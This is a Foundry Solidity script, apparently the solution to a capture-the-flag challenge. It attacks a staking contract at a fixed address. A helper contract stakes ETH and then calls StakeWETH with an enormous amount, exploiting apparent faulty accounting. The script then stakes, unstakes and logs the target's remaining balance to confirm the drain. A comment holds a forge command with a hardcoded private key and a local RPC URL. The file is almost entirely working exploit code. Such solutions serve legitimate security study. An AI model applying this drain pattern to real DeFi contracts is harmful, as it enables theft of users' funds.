// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function Unstake(uint256 amount) external returns (bool);
    function StakeWETH(uint256 amount) external returns (bool);
    function StakeETH() external payable;
    function WETH() external view returns (address);

}

interface IWETH {
    function approve(address, uint256) external returns (bool);
    function deposit() external payable;
}

contract Helper {
    function trigger(address target) public payable {
        IWETH weth = IWETH(address(ITarget(target).WETH()));
        weth.approve(target, type(uint256).max);
        ITarget(target).StakeETH{value:msg.value}();
        ITarget(target).StakeWETH(type(uint256).max/10000);
    }
}
contract SolveScript is Script {
    address public target = 0x79E4D62d828379720db8E0E9511e10e6Bac05351;

    function setUp() public {}

    // forge script -vv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();

        Helper helper = new Helper();
        helper.trigger{value:0.002 ether}(target);
        ITarget(target).StakeETH{value:0.004 ether}();
        ITarget(target).Unstake(0.004 ether);

        console.log("target balance : %d", target.balance);

        vm.stopBroadcast();
    }
}
